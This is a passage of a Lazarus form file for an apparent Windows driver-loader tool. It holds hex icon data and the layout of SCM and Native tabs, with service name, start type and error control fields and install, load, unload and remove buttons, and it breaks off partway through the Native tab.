    ADACFFA4A2A1FF7C7A783A00000000000000007371705E807E7D537A77761C94
    9190AFB6B4B2FFC5C3C2FFC6C4C3FFCAC8C7FFCCCAC9FFC4C2C1FFB5B3B1E28B
    8685030000000000000000000000000000000000000000000000000000000000
    0000000000000000000000000000000000000000000000ABA9A7CEBEBCBAFFC3
    C1BFFFC8C6C5FFCDCBCAFFD2D0CFFFD7D5D5FFC8C7C6E09F9C9B7A9F9D9C8499
    96957E928E8E679A98976ACECCCBFDCCCAC9FFC2C0BFFFB9B7B5FFB0ADACFFA6
    A4A3FF9D9A99FF807D7C77000000007C79782C8F8C8BF7A19F9EFFADABAAFDAB
    A9A7FFB8B6B4FFC2C0BFFFCAC9C7FFD0CECDFFD5D4D3FFB5B3B1FFA09D9CCE71
    6E6E060000000000000000000000000000000000000000000000000000000000
    0000000000000000000000000000000000000099969407B5B3B1F0C3C1BFFFC8
    C6C5FFCDCBCAFFD2D0CFFFD7D5D5FFD8D7D7FFAAA7A64F000000000000000000
    0000000000000000000000A19E9D8BC1BFBEFFB9B7B5FFB0ADACFFA6A4A3FF9D
    9A99FF949190FF7B7878B4000000008A86851BA2A09FD4B8B6B5FFB2B0AFFFA4
    A2A1FFACA9A8FFB0AEACFFBAB8B6FFC5C3C1FFCFCDCCFFBDBBBAFF9D9B9AFF8B
    8988979795946082807F3D000000000000000000000000000000000000000000
    000000000000000000000000000000000000009C999722BDBAB9FDC8C6C5FFCD
    CBCAFFD2D0CFFFD7D5D5FFDCDBDAFFBEBBBBB000000000000000000000000000
    00000000000000000000007D7A79089F9D9BC8B0ADACFFA6A4A3FF9D9A99FF8D
    8A89FF706E6DF75F5E5D8E5B5A5A01000000008B888726C9C7C6FCAFADACFFC3
    C1BFFFADABAAF3A4A2A05DA9A7A524B5B3B270BAB8B7FBC9C7C6FFA3A2A0FFB0
    AEACFFBBB9B7FF979594C3000000000000000000000000000000000000000000
    000000000000000000000000000000000000009F9D9B14A09E9C90AAA7A6E6BD
    BBBAFFD3D2D1FFDCDBDAFFD0CFCEF19795942000000000000000000000000000
    000000000000000000000000000000747271259A9796EF8F8D8CFF706D6CEC5E
    5C5B875D5C5B190000000000000000000000008987863DCFCDCCFFB9B7B6FFD1
    CFCEFFACAAA97C0000000000000000000000009694939EB9B6B5FFABA9A7FFC1
    BFBEFFCAC8C7FEA5A3A3C2000000000000000000000000000000000000000000
    0000000000000000000000000000000000000000000000000000009491900893
    908F4D939190AAA9A7A6F5A5A3A2740000000000000000000000000000000000
    00000000000000000000000000000000000000666463555C5B5A725D5B5B1000
    000000000000000000000062606006A7A5A46DBAB8B7DCC4C2C1FFB0AEACFFC9
    C7C6FFC0BEBD62000000000000000000000000A7A5A383ABA9A8FFA6A4A3FFCE
    CCCBFF8F8D8D516A696802000000000000000000000000000000000000000000
    0000000000000000000000000000000000000000000000000000000000000000
    0000000000000082807F13807E7D060000000000000000000000000000000000
    0000000000000000000000000000000000000000000000000000000000000000
    00000000000000000000005D5B5B0AB0AFAEFAC1BFBDFFB9B7B5FFA09E9DFFAE
    ACAAFFB8B6B4C89794930B00000000ACAAA916BAB8B7DEB5B3B1FFC4C2C1FFCF
    CECEF37573720C00000000000000000000000000000000000000000000000000
    0000000000000000000000000000000000000000000000000000000000000000
    0000000000000000000000000000000000000000000000000000000000000000
    0000000000000000000000000000000000000000000000000000000000000000
    0000000000000000000000000000008B8988A5A09E9DC4A19F9EE79F9D9CFF8A
    8786FFA19F9DFFA5A3A2E6ACAAA8B9D2D0CFEECFCDCCFFBDBBBAFFD7D5D5FFDD
    DCDBFBB2AFAE6300000000000000000000000000000000000000000000000000
    0000000000000000000000000000000000000000000000000000000000000000
    0000000000000000000000000000000000000000000000000000000000000000
    0000000000000000000000000000000000000000000000000000000000000000
    00000000000000000000000000000000000000000000007E7B7A3FA19E9DFA95
    9291FF7C7978FF949190FFABA9A7FFBEBCBBFFC3C1C0FFC4C2C2FFD6D5D4FFC3
    C1C0FFAFADABFAA19E9D25000000000000000000000000000000000000000000
    0000000000000000000000000000000000000000000000000000000000000000
    0000000000000000000000000000000000000000000000000000000000000000
    0000000000000000000000000000000000000000000000000000000000000000
    00000000000000000000000000000000000000000000008D8A8903ACAAA9E6BF
    BDBBFFB2B0AFFF949291FF999796FFBFBEBDFFD8D6D5FFC5C3C2ECB0AEAC85A2
    A09ED5959291A29B979601000000000000000000000000000000000000000000
    0000000000000000000000000000000000000000000000000000000000000000
    0000000000000000000000000000000000000000000000000000000000000000
    0000000000000000000000000000000000000000000000000000000000000000
    0000000000000000000000000000000000000000000000ABA8A64AC5C4C2FFD0
    CECDFFCCC9C9CFCCCAC9D5DDDBDBF8D4D2D2FFBEBCBAF88E8C8B20000000007D
    7C7A0183827F0600000000000000000000000000000000000000000000000000
    0000000000000000000000000000000000000000000000000000000000000000
    0000000000000000000000000000000000000000000000000000000000000000
    0000000000000000000000000000000000000000000000000000000000000000
    0000000000000000000000000000000000000000000000A19D9B15B0AEADA1C4
    C2C2BBADA9A90C00000000ABA8A77CB5B3B2FFA09D9CF7787574100000000000
    0000000000000000000000000000000000000000000000000000000000000000
    0000000000000000000000000000000000000000000000000000000000000000
    0000000000000000000000000000000000000000000000000000000000000000
    0000000000000000000000000000000000000000000000000000000000000000
    00000000000000000000000000000000000000000000000000000083807E0185
    83820500000000000000007E7C7B18838180A67371706F625F5F060000000000
    0000000000000000000000FFF9FF0FFFFF0A20FFE0FF01FFFF203CFF807E01FF
    FF506FFF807C01FFFF3622FF800001FFFF3022FF800003FFFF2020FFC00003FF
    FF7361FFC00001FFFF7420FF800000FFFF2238FF00000061FF20209F00000000
    FF556E8000000000FF202080000000007F6E6900000000007F20200000000000
    7F466900000800007F205600003F0001FF6E6180007F8003FF702EE000FF8007
    FF0D0AF000FFC007FF2020F001FFC007FF744FF001FFC007FF6374F000FF8003
    FF3D22F000FF8001FF3E0DE0007F00007F202080001C00003F6F720000000000
    3F566100000000007F222F00000000007F20208000000000FF72738000000020
    FF583DC10000007FFF3D22DF800000FCFF2020FFC00001F8473C55FFE00000F8
    03756EFFE00000C003653DFFE0000080030D0AFFC01F0080002020FFC03F0040
    006420FFC03F81C1C02254FFF07FC701C00D0AFFFE7FFF00813C2FFFFFFFFF80
    010D0AFFFFFFFFE0003C55FFFFFFFFE0000A20FFFFFFFFE009203CFFFFFFFFE1
    0F6D65FFFFFFFFF30F3D22280000002000000040000000010020000000000000
    1000006400000064000000000000000000000000000000000000000000000000
    0000000000000000000000000000000000000052505021545252610000000000
    000000000000000000000000000000000000008F8D8C63858382A06D6B6A4273
    7171020000000000000000000000000000000000000000000000000000000000
    0000000000000000000000000000000000000000000000000000000000000000
    0000000000000000000000504E4E305A5858A7747171FB8F8D8CFF7674735B00
    0000000000000000000000000000007F7C7B18C9C7C7EFD3D1D0FFBCBBB9FF9C
    9A99E17D7B791F00000000000000000000000000000000000000000000000000
    0000000000000000000000000000000000000000000000000000000000000000
    00000000000000000000006A6867A0878583FF928F8EFF9D9A99FF9E9C9AF378
    767628000000000000000000000000B1AFAEA5D3D1D0FFCDCBCAFFC7C5C4FFBD
    BBBAFF817F7E1100000000000000000000000000000000000000000000000000
    0000000000000000000000000000000000000000000000000000000000000000
    000000000000000000000072706F63928F8EFF9D9A99FFA7A4A3FFB1AFAEFFA9
    A7A5D9989695A8A4A2A1BBAAA8A7BACFCDCCFFCDCBCAFFC7C5C4FFC1BFBEFFB0
    AEADEC0000000000000000000000000000000000000000000000000000000000
    0000000000000000000000000000000000000000000000000000000000000000
    0000000000000000000000676565269B9897FFA7A4A3FFB1AFAEFFBCBAB8FFC6
    C5C3FFD1CFCEFFD6D4D4FFD3D1D0FFCDCBCAFFC7C5C4FFC1BFBEFFBCBAB8FFAA
    A8A6C80000000000000000000000000000000000000000000000000000000000
    0000000000000000000000000000000000000000000000000000000000000000
    00000000000000000000006C69680F9B9997F7B1AFAEFFBCBAB8FFC6C4C3FFC9
    C7C6FFBDBBBAFFB5B3B2FFC1BFBEFFCBC9C8FFC4C2C1FFBCBAB8FFB6B4B2FFA4
    A2A1F07B79784E00000000000000000000000000000000000000000000000000
    0000000000000000000000000000000000000000000000000000000000000000
    00000000000000706D6C108B8988CDB1AFAEFFBCBAB8FFCFCECDFFD1CFCEFFD0
    CECEFFD8D6D6FFD9D8D8FFD9D8D8FFD8D7D7FFDDDBDBFFA6A4A3FFA9A7A5FFAA
    A8A6FF9C9998FC7370705E676564067875753892908F757775747D0000000000
    00000000000000000000000000000000000000000000006F6D6C837D7B7A7D81
    7E7D597E7B7A368B8887B6B1AFAEFFBAB8B6FFBAB9B7FFD6D4D3FFD0CECDFFD0
    CECDFFD0CECDFFD0CECDFFD0CECDFFD0CECDFFD0CECDFFCECDCBFF9F9D9CFF94
    9291FFA09D9CFF999796FB9F9D9BF5B0AEADFFB8B6B5FF9F9D9CFD5856552600
    000000000000000000000000000000000000006B696824807E7DFE928F8EFF9D
    9A99FFA7A5A3FFB1AFAEFFBCBAB8FF918F8EFFC1BFBEFFC5C3C2FFC5C3C2FFC5
    C3C2FFC5C3C2FFC5C3C2FFC5C3C2FFC5C3C2FFC5C3C2FFC5C3C2FFC5C4C2FFA1
    9F9EFF949291FFA9A7A5FFB1AFADFFB9B7B5FFC0BEBCFFC7C5C4FF6E6C6C9900
    0000000000000000000000000000000000000077747381928F8EFF9D9A99FFA7
    A5A3FFB2AFAEFFBCBAB8FF9B9998FFADABAAFFBBB9B7FFBBB9B7FFBBB9B7FFBB
    B9B7FFBAB8B6FFB0ADACF1BDBBB9FABBB9B8FFBBB9B7FFBBB9B7FFBBB9B7FFBB
    B9B8FF8F8D8CFFAFADABFFB9B7B5FFC0BEBCFFC8C6C4FFCFCECCFFA09E9EEE5E
    5D5D0800000000000000000000000000000000868382CE9D9A99FFA7A5A3FFB2
    AFAEFFBCBAB8FFC5C3C2FF8B8988FFB0AEADFFB0AEACFFB0AEACFFAEACABFFBF
    BDBCA8BDBBB92500000000CCCAC908A7A5A35DA19E9DEBB0AEACFFB0AEACFFB0
    AEACFFACAAA8FF999795FFC0BEBCFFC8C6C4FFCFCECCFFBAB8B7D38280802C00
    0000000000000000000000000000000000000086838217999795A2B0AEACFEBC
    BAB8FFC6C5C3FFB3B1B0FF9E9C9BFFA9A7A5FFA9A7A5FFA9A7A5FF7F7D7CA475
    706F01000000000000000000000000000000006A69682E9D9B9AF8A9A7A5FFA9
    A7A5FFAAA8A6FF939190FFC8C6C5FFCCCBC9FFA5A3A39A646261090000000000
    00000000000000000000000000000000000000000000000000000095939141B6
    B5B3EAD1CFCEFFABA9A8FFB1AFADFFB2B0AEFFB2B0AEFFA7A4A3FD5755551C00
    00000000000000000000000000000000000000000000008C8A899CB2B0AEFFB2
    B0AEFFB2B0AEFF92908FFFCFCDCCFFCDCBCAFF6A67663A000000000000000000
    00000000000000000000000000000000000000000000000000000000000000AB
    A9A8CFD7D5D4FFADABAAFFB9B7B6FFBDBBB9FFBDBBB9FFABA8A7E20000000000
    00000000000000000000000000000000000000000000009D9A9964BDBBB9FFBD
    BBB9FFBDBBB9FFA7A5A4FFD1D0CFFFDDDCDBFF7471704E000000000000000000
    00000000000000000000000000000000000000000000000000000000000000A8
    A5A5CBD2D1CFFFB2B0AEFFC0BEBCFFC7C5C4FFC7C5C4FFBDBBB9EEA8A6A20100
    0000000000000000000000000000000000000000000000CFCDCC72C7C5C4FFC7
    C5C4FFC7C5C4FFC8C6C5FFDEDDDCFFE4E2E2FF7F7D7B4B000000000000000000
    00000000000000000000000000000000000000000000000000000000000000A1
    9F9EBCCDCBCAFFBAB8B7FFBEBCBBFFD1CFCEFFD1CFCEFFD0CECDFFB7B5B34500
    000000000000000000000000000000000000009F9D9801B9B7B6C6D1CFCEFFD1
    CFCEFFD1CFCEFFC1BFBEFFE6E5E4FFE9E8E8FFCFCDCDE4A8A5A4540000000000
    00000000000000000000000000000000000000000000006967670BA8A6A5A1CB
    C9C8FFC7C5C4FFBFBDBCFFB2AFAEFFD2D0CFFFD2D0CFFFD2D0CFFFC9C7C5DEAB
    A9A71E00000000000000000000000000000000C4C2C07ED0CECDFFD2D0CFFFD2
    D0CFFFC8C6C5FFBEBCBBFFE9E8E8FFDEDDDDFFD1CFCEFFC2C0BEFFABA8A7B79E
    9B9A1F000000000000000000000000000000007B79792BB8B6B5D5CDCBCAFFC7
    C5C4FFC1BFBEFFBBB9B8FFADABA9FFBEBCBAFFC6C4C2FFC6C4C2FFC6C4C2FFBC
    BAB8EF9D9A998A757372577C7A7A68BCB9B8C0C7C5C3FFC6C4C2FFC6C4C2FFC6
    C4C2FFA09E9DFFD6D4D4FFDEDDDDFFD0CFCEFFC2C1BFFFB4B2B1FFA6A4A3FF9E
    9B9A390000000000000000000000000000000069676672C6C4C3FFC7C5C4FFC1
    BFBEFFBBB9B8FFB6B4B2FFB2AFAEFFA2A09FFFB3B1B0FFB4B2B1FFB4B2B1FFB4
    B2B1FFB4B2B1FFB4B2B1FFB4B2B1FFB4B2B1FFB4B2B1FFB4B2B1FFB4B2B1FFA8
    A6A5FFB6B3B3FFDEDDDDFFD0CFCEFFC2C1BFFFB4B2B1FFA6A4A3FF999695D996
    929101000000000000000000000000000000005A58580D92908FEFC1BFBEFFBB
    B9B8FFB6B4B2FFB0AEACFFAAA8A7FFA8A6A4FF969492FF9D9A99FF9E9C9AFF9E
    9C9AFF9E9C9AFF9E9C9AFF9E9C9AFF9E9C9AFF9E9C9AFF9E9C9AFF999796FFB9
    B7B6FFDCDBDAFFD0CFCDFFBAB8B6E2B0ADACF1A5A3A2FF989695FF8B88877B00
    000000000000000000000000000000000000000000000066646386B6B4B2FFA4
    A2A1E6999796A9878584969E9C9AFFA09D9CFFA3A19FFF8F8C8BFF827F7EFF84
    8180FF848180FF848180FF848180FF848180FF83807FFF999796FFD4D3D2FFDD
    DCDCFFD0CFCEFFB2B0AED79B98970F969191018D8A891B8886854382807F1500
    00000000000000000000000000000000000000000000005C5959106362612400
    00000000000000000000007B7978779C9998FEA9A7A6FFB0AEACFFA3A09FFF82
    807FFF696666FF636160FF62605FFF6C6969FF999796FFDCDADAFFDEDDDCFFD0
    CFCEFFB1AFAED78F8D8C1D0000000000000000000000005554540A5A59591C00
    0000000000000000000000000000000000000000000000000000000000000000
    0000000000000000000000000000008B88876EB1AFADFFB9B7B5FFC0BEBDFFC8
    C6C5FFCCCBC9FFC9C7C7FFD4D3D3FFE6E4E4FFE9E8E8FFDEDDDCFFD0CFCDFFC2
    C1BFFFA5A3A289000000000000000000000000000000007F7C7BC1979594D86F
    6C6C02A6A4A338A3A1A0847C7B79070000000000000000000000000000000000
    000000000000000000000000000000A09E9D68B9B7B5FFC0BEBDFFC8C6C5FFCF
    CECDFFD7D5D4FFDEDDDDFFE5E4E4FFE4E2E2FFDEDDDCFFD0CFCDFFC2C0BFFFB4
    B2B1FF9B9998C6000000006C6A69097C7A79458381802AA6A4A3E1C1BFBDFFBB
    B9B9F2C6C4C3F3BEBCBBF2908D8C0B0000000000000000000000000000000000
    000000000000000000000000000000ADABA990C0BFBDFFC8C6C5FFCFCECDFFD7
    D5D5FFBDBBBA98A09D9C579794935098959445C5C4C2EFC2C0BFFFB4B2B1FFA6
    A4A3FF949190F96664640A88858470A3A1A0FFADABAAFEAEACABFFBFBEBCFFCC
    CAC9FFCDCBCAFFA4A1A0E9777574150000000000000000000000000000000000
    000000000000000000000000000000B5B3B1B9C8C6C5FFD0CECDFFD7D5D5FFCE
    CDCCDC9996940900000000000000000000000098959455B2B0AFFFA6A4A3FF95
    9291FF777574EC5F5D5D25918D8C0BBAB8B7D5B3B1AFFFB2B0AEFAABA9A786B7
    B5B38FC3C1C0FDADABAAFFA9A6A5F09C9A99C000000000000000000000000000
    000000000000000000000000000000A09E9C49AAA8A7AEBBB9B8F9D7D6D5FFAB
    A9A8470000000000000000000000000000000000000000888685997B7978DE62
    605F6D5D5C5C0B0000000088868512BEBCBBDFBFBEBCFFBFBDBBA00000000000
    000000A09E9DB6AEACAAFFC2C0BFF8AEACAB9700000000000000000000000000
    00000000000000000000000000000000000000000000008A8786138784835000
    00000000000000000000000000000000000000000000005D5B5A075B5A5A0400
    000000000000005E5C5C07B8B6B5F1BEBCBAFFA8A6A4FFBAB8B7C698949305AD
    AAA90AB8B6B4D7B7B5B3FFBFBDBCB20000000000000000000000000000000000
    0000000000000000000000000000000000000000000000000000000000000000
    0000000000000000000000000000000000000000000000000000000000000000
    0000000000000000000000939190759B9997A9999695FF928F8EFFA4A2A1E4C6
    C5C3E8CAC8C7FFCDCBCBFFCECCCBE8A9A6A52D00000000000000000000000000
    0000000000000000000000000000000000000000000000000000000000000000
    0000000000000000000000000000000000000000000000000000000000000000
    000000000000000000000000000000817D7C06AEACAAF2A5A2A1FF939090FFB4
    B2B1FFCCCBCAFFC0BEBDC0A6A4A2E99C99983600000000000000000000000000
    0000000000000000000000000000000000000000000000000000000000000000
    0000000000000000000000000000000000000000000000000000000000000000
    000000000000000000000000000000A8A6A42AC8C6C5FCCBC9C9B3CBC9C89AD1
    CFCEFFAFADACB70000000081807E030000000000000000000000000000000000
    0000000000000000000000000000000000000000000000000000000000000000
    0000000000000000000000000000000000000000000000000000000000000000
    00000000000000000000000000000000000000A19F9D2D989795050000000092
    908FA2817F7E6F000000000000000000000000FF3F0FFFFC1E07FFFC0E07FFFC
    000FFFFC000FFFFC0007FFF800003F8000001F0000001F0000000F0004001F00
    0F003FC01F807FE03F807FE01F807FE01F003F800F000F0000000F0000000F00
    00001F8000001F9C00039FFE000781FE000401FE000001FE070000FE0F8430FF
    9F9801FFFFFC00FFFFFE00FFFFFE05FFFFFF2728000000100000002000000001
    0020000000000000040000640000006400000000000000000000000000000000
    00000000000000575555367573729F76747317000000007F7C7B06B3B1B1BCA2
    A09F897D7B790800000000000000000000000000000000000000000000000000
    00000000000000817E7DC09C9A99FFA4A2A1BD9E9C9B59BBB9B897CDCBCAFFBE
    BCBAFA82807E0400000000000000000000000000000000000000000000000000
    000000000000009391908BB1AFAEFFC4C2C1FFC6C4C4FFCBC9C8FFC2C0BFFFB0
    AEADED7B79781400000000000000000000000000000000000000006F6D6C217F
    7C7B368583813FABA8A7F2C7C5C4FFD0CECDFFD4D3D2FFD4D3D2FFC8C6C5FFA2
    A09EFF969392D59F9D9C8C9D9B9ABB58565509000000000000000083807FA99D
    9A99FFB1AFAEFFA5A3A2FFBFBDBBFFC0BEBCFFBDBBB9FCC1BFBDFEC0BEBCFFB7
    B5B4FF9F9D9BFFB8B6B5FFC7C5C4FF89878664000000000000000093918FA2B1
    AFADFFBFBDBBFFA19F9DFFADABA9FFA5A3A293BAB8B709ADABAA19A09E9CC4AD
    ABA9FFA09E9DFFC7C5C4FFBAB8B79D8280800B000000000000000000000000AD
    AAA97EC0BEBDFFB6B4B3FFB0AEACF757555507000000000000000093908F40B7
    B5B4FFAAA8A6FFD2D1D0FF6F6D6C2200000000000000000000000000000000A4
    A2A162C3C1C0FFC5C3C2FFC9C7C6FBB6B4B2120000000000000000C1BFBE4ECC
    CAC9FFC8C6C5FFE4E3E3FFB4B1B161000000000000000000000000A5A4A343C3
    C2C0E7C1BFBDFFBBBAB8FFCCCAC8FFC2C0BFBB8D8B8A38A5A3A24AC8C7C5DFCC
    CAC8FFBFBDBCFFDEDCDCFFC2C0BFFFA6A4A28300000000000000009A99989BC1
    BFBEFFB6B4B2FFAAA7A6FFA6A4A3FFA9A7A5FFA9A7A5FFA9A7A5FFA9A7A5FFAC
    A9A8FFD0CECEFFBFBDBCF4A6A4A3FF94919055000000000000000064626226A5
    A3A282918F8E50989594DDA3A09FFF8B8887FF757271FF757372FFA4A2A1FFD8
    D7D6FFBAB8B7B29A969504807E7D1A6C6A690C00000000000000000000000000
    0000000000000095929135B9B7B5FFC8C6C5FFD3D1D0FFE1DFDFFFDDDCDBFFC2
    C0BFFF9F9D9C5479777614918F8E73B1AFAEB3B8B6B5A8898685050000000000
    00000000000000B2AFAE52C8C6C5FFD3D1D1F6B1AEAD3E97959425B9B7B6D0A5
    A3A2FF807E7D85A5A2A194B0AEADFEBEBCBAC5B8B6B5F9A09E9C710000000000
    00000000000000A09E9C12B1AFAE6FBBB9B86600000000000000008482812871
    6F6E545E5C5C05B9B8B6B8B7B5B4D9A6A3A204B0AEACE3BBB9B9900000000000
    0000000000000000000000000000000000000000000000000000000000000000
    00000000000000969493499F9D9CFCACAAA9F3C9C8C7EFB5B2B18D0000000000
    0000000000000000000000000000000000000000000000000000000000000000
    00000000000000A8A6A40BC3C1C078BBB9B88F9D9B9A4981807E01E21F6824E0
    1F7DFEE01F8EFF000399FF0003A3FF0003AEFF8307B8FF83078EFF0003BEFF00
    03C2FF0003C2FFE000C2FFE000C2FFE300C2FFFFE0C2FFFFE0C2FF
  }
  OnCreate = FormCreate
  OnDropFiles = FormDropFiles
  Position = poDesktopCenter
  LCLVersion = '2.0.12.0'
  object PageControl1: TPageControl
    Left = 0
    Height = 471
    Top = 0
    Width = 606
    ActivePage = AboutSheet
    Align = alClient
    TabIndex = 4
    TabOrder = 0
    object ScmTabSheet: TTabSheet
      Caption = 'SCM'
      ClientHeight = 443
      ClientWidth = 598
      OnShow = ScmTabSheetShow
      object GroupBox1: TGroupBox
        AnchorSideLeft.Control = ScmTabSheet
        AnchorSideRight.Control = ScmTabSheet
        AnchorSideRight.Side = asrBottom
        Left = 10
        Height = 423
        Top = 10
        Width = 578
        Align = alClient
        BorderSpacing.Left = 10
        BorderSpacing.Top = 10
        BorderSpacing.Right = 10
        BorderSpacing.Bottom = 10
        Caption = 'Parameters'
        ClientHeight = 403
        ClientWidth = 574
        TabOrder = 0
        object Label1: TLabel
          Left = 10
          Height = 15
          Top = 52
          Width = 56
          Caption = 'File Name:'
          ParentColor = False
        end
        object EditScmFileName: TEdit
          AnchorSideRight.Control = ButtonScmOpenFile
          AnchorSideRight.Side = asrBottom
          Left = 96
          Height = 23
          Hint = 'Full path name for the binary file This parameter is mandatory for service installation task.'
          Top = 49
          Width = 428
          Anchors = [akTop, akLeft, akRight]
          BorderSpacing.Right = 40
          ParentShowHint = False
          ReadOnly = True
          ShowHint = True
          TabOrder = 1
        end
        object ButtonScmOpenFile: TButton
          AnchorSideRight.Control = GroupBox1
          AnchorSideRight.Side = asrBottom
          Left = 532
          Height = 25
          Top = 48
          Width = 32
          Anchors = [akTop, akRight]
          BorderSpacing.Right = 10
          Caption = '...'
          OnClick = ButtonOpenFileClick
          TabOrder = 2
        end
        object Label2: TLabel
          Left = 10
          Height = 15
          Top = 88
          Width = 55
          Caption = 'Start Type:'
          ParentColor = False
        end
        object ComboBoxScmStartType: TComboBox
          AnchorSideRight.Control = GroupBox1
          AnchorSideRight.Side = asrBottom
          Left = 96
          Height = 23
          Top = 86
          Width = 468
          Anchors = [akTop, akLeft, akRight]
          BorderSpacing.Right = 10
          ItemHeight = 15
          ItemIndex = 3
          Items.Strings = (
            'SERVICE_BOOT_START (0x0)'
            'SERVICE_SYSTEM_START (0x1)'
            'SERVICE_AUTO_START (0x2)'
            'SERVICE_DEMAND_START (0x3)'
            'SERVICE_DISABLED (0x4)'
          )
          Style = csDropDownList
          TabOrder = 3
          Text = 'SERVICE_DEMAND_START (0x3)'
        end
        object Label3: TLabel
          Left = 10
          Height = 15
          Top = 123
          Width = 71
          Caption = 'Error Control:'
          ParentColor = False
        end
        object ComboBoxScmErrorControl: TComboBox
          AnchorSideRight.Control = GroupBox1
          AnchorSideRight.Side = asrBottom
          Left = 96
          Height = 23
          Top = 123
          Width = 468
          Anchors = [akTop, akLeft, akRight]
          BorderSpacing.Right = 10
          ItemHeight = 15
          ItemIndex = 0
          Items.Strings = (
            'SERVICE_ERROR_IGNORE (0x0)'
            'SERVICE_ERROR_NORMAL (0x1)'
            'SERVICE_ERROR_SEVERE (0x2)'
            'SERVICE_ERROR_CRITICAL (0x3)'
          )
          Style = csDropDownList
          TabOrder = 4
          Text = 'SERVICE_ERROR_IGNORE (0x0)'
        end
        object Label4: TLabel
          Left = 10
          Height = 15
          Top = 158
          Width = 76
          Caption = 'Display Name:'
          ParentColor = False
        end
        object EditScmDisplayName: TEdit
          AnchorSideRight.Control = GroupBox1
          AnchorSideRight.Side = asrBottom
          Left = 96
          Height = 23
          Hint = 'Service display name used by Windows device manager, optional parameter.'
          Top = 156
          Width = 468
          Anchors = [akTop, akLeft, akRight]
          BorderSpacing.Right = 10
          ParentShowHint = False
          ShowHint = True
          TabOrder = 5
        end
        object ButtonScmInstall: TButton
          Left = 120
          Height = 25
          Hint = 'Install driver using SCM CreateService API.'
          Top = 288
          Width = 75
          Caption = 'Install'
          OnClick = ButtonScmInstallClick
          ParentShowHint = False
          ShowHint = True
          TabOrder = 6
        end
        object ButtonScmLoad: TButton
          Tag = 1
          Left = 202
          Height = 25
          Hint = 'Load driver.'
          Top = 288
          Width = 75
          Caption = 'Load'
          OnClick = ManageInstalledDriverSCM
          ParentShowHint = False
          ShowHint = True
          TabOrder = 7
        end
        object ButtonScmUnload: TButton
          Tag = 2
          Left = 284
          Height = 25
          Hint = 'Unload driver.'
          Top = 288
          Width = 75
          Caption = 'Unload'
          OnClick = ManageInstalledDriverSCM
          ParentShowHint = False
          ShowHint = True
          TabOrder = 8
        end
        object ButtonScmRemove: TButton
          Tag = 3
          Left = 364
          Height = 25
          Hint = 'Remove service using SCM DeleteService API.'
          Top = 288
          Width = 75
          Caption = 'Remove'
          OnClick = ManageInstalledDriverSCM
          ParentShowHint = False
          ShowHint = True
          TabOrder = 9
        end
        object Label5: TLabel
          Left = 10
          Height = 15
          Top = 16
          Width = 35
          Caption = 'Name:'
          ParentColor = False
        end
        object EditScmName: TEdit
          AnchorSideRight.Control = GroupBox1
          AnchorSideRight.Side = asrBottom
          Left = 96
          Height = 23
          Hint = 'Name of the service entry, this is mandatory parameter for any SCM task.'
          Top = 12
          Width = 468
          Anchors = [akTop, akLeft, akRight]
          BorderSpacing.Right = 10
          ParentShowHint = False
          ShowHint = True
          TabOrder = 0
        end
        object LabelPrivInfoScm: TLabel
          Left = 10
          Height = 15
          Top = 376
          Width = 23
          Caption = 'Hint'
          ParentColor = False
        end
      end
    end
    object NativeTabSheet: TTabSheet
      Caption = 'Native'
      ClientHeight = 443
      ClientWidth = 598
      OnHide = NativeTabSheetHide
      OnShow = NativeTabSheetShow
      object GroupBox3: TGroupBox
        AnchorSideLeft.Control = NativeTabSheet
        AnchorSideRight.Control = NativeTabSheet
        Left = 10
        Height = 423
        Top = 10
        Width = 578
        Align = alClient
        BorderSpacing.Left = 10
        BorderSpacing.Top = 10
        BorderSpacing.Right = 10
        BorderSpacing.Bottom = 10
        Caption = 'Parameters'
        ClientHeight = 403
        ClientWidth = 574
        TabOrder = 0
        object Label6: TLabel
          Left = 10
          Height = 15
          Top = 52
          Width = 56
          Caption = 'File Name:'
          ParentColor = False
        end
        object EditNativeFileName: TEdit
          AnchorSideRight.Control = ButtonNativeOpenFile
          AnchorSideRight.Side = asrBottom
          Left = 96
          Height = 23
          Hint = 'Full path name for the binary file.'
          Top = 49
          Width = 428
          Anchors = [akTop, akLeft, akRight]
          BorderSpacing.Right = 40
          ParentShowHint = False
          ReadOnly = True
          ShowHint = True
          TabOrder = 1
        end
        object ButtonNativeOpenFile: TButton
          AnchorSideRight.Control = GroupBox3
          AnchorSideRight.Side = asrBottom
          Left = 532
          Height = 25
          Top = 48
          Width = 32
          Anchors = [akTop, akRight]
          BorderSpacing.Right = 10
          Caption = '...'
          OnClick = ButtonOpenFileClick
          TabOrder = 2
        end
        object Label7: TLabel
          Left = 10
          Height = 15
          Top = 88
          Width = 55
          Caption = 'Start Type:'
          ParentColor = False
        end
        object ComboBoxNativeStartType: TComboBox
          AnchorSideRight.Control = GroupBox3
          AnchorSideRight.Side = asrBottom
          Left = 96
          Height = 23
          Top = 86
          Width = 468
          Anchors = [akTop, akLeft, akRight]
          BorderSpacing.Right = 10
          ItemHeight = 15
          ItemIndex = 3
          Items.Strings = (
            'SERVICE_BOOT_START (0x0)'
            'SERVICE_SYSTEM_START (0x1)'
            'SERVICE_AUTO_START (0x2)'
            'SERVICE_DEMAND_START (0x3)'
            'SERVICE_DISABLED (0x4)'
          )
          Style = csDropDownList
          TabOrder = 3
          Text = 'SERVICE_DEMAND_START (0x3)'
        end
        object Label8: TLabel
          Left = 10
          Height = 15
          Top = 123
          Width = 71
          Caption = 'Error Control:'
          ParentColor = False
        end
        object ComboBoxNativeErrorControl: TComboBox
          AnchorSideRight.Control = GroupBox3
          AnchorSideRight.Side = asrBottom
          Left = 96
          Height = 23
          Top = 123
          Width = 468
          Anchors = [akTop, akLeft, akRight]
          BorderSpacing.Right = 10
          ItemHeight = 15
          ItemIndex = 0
          Items.Strings = (
            'SERVICE_ERROR_IGNORE (0x0)'
            'SERVICE_ERROR_NORMAL (0x1)'
            'SERVICE_ERROR_SEVERE (0x2)'
            'SERVICE_ERROR_CRITICAL (0x3)'
          )
          Style = csDropDownList
          TabOrder = 4
          Text = 'SERVICE_ERROR_IGNORE (0x0)'
        end
        object Label9: TLabel
          Left = 10
          Height = 15
          Top = 158
          Width = 76
          Caption = 'Display Name:'
          ParentColor = False
        end
        object EditNativeDisplayName: TEdit
          AnchorSideRight.Control = GroupBox3
          AnchorSideRight.Side = asrBottom
          Left = 96
          Height = 23
          Hint = 'Service display name used by Windows device manager, optional parameter.'
          Top = 156
          Width = 468
          Anchors = [akTop, akLeft, akRight]
          BorderSpacing.Right = 10
          ParentShowHint = False
          ShowHint = True
          TabOrder = 5
        end
        object ButtonNativeInstall: TButton
          Left = 120
          Height = 25
